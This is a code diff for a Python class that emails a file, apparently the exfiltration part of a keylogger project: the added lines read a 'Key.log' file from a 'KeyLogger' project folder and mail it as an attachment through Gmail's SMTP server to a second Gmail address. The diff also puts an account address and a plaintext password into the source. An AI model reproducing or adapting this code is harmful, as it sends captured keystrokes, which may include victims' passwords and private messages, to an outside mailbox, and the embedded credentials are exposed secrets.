@@ -1,7 +1,5 @@
 import smtplib
-import time
 from email import encoders
-from email.mime.application import MIMEApplication
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -10,9 +8,9 @@ class emailSender:
     def Email():
         try:
 
-            user = 'sender@company.com'
-            to = "destination@comapny.com"
-            passwOrd = "plaintext"
+            user = 'gamesegames44@gmail.com'
+            to = "gamesegamesshaddy@gmail.com"
+            passwOrd = "games:0044"
 
             msg = MIMEMultipart()
 
@@ -23,7 +21,7 @@ class emailSender:
 
             msg.attach( MIMEText( body, "plain" ) )
             filename = "Key.txt"
-            attachment = open( 'C:\\Users\\User\Key.txt', "rb" )
+            attachment = open( 'C:/Users/Pedro Vieira-PC/PycharmProjects/KeyLogger/venv/Include/Key.log', "rb" )
 
             part = MIMEBase( "application", "octet-stream" )
             part.set_payload( (attachment).read() )
@@ -32,7 +30,7 @@ class emailSender:
 
             msg.attach( part )
 
-            server = smtplib.SMTP_SSL( 'smtp.company.com',
+            server = smtplib.SMTP_SSL( 'smtp.gmail.com',
                                        465 )  # using smtplib.SMTP_SSL instead to ensure secure connection
             # server.ehlo() <- command to create a insecure connection
             # server.starttls() <- make the connection secure (Google doesn't support this method)
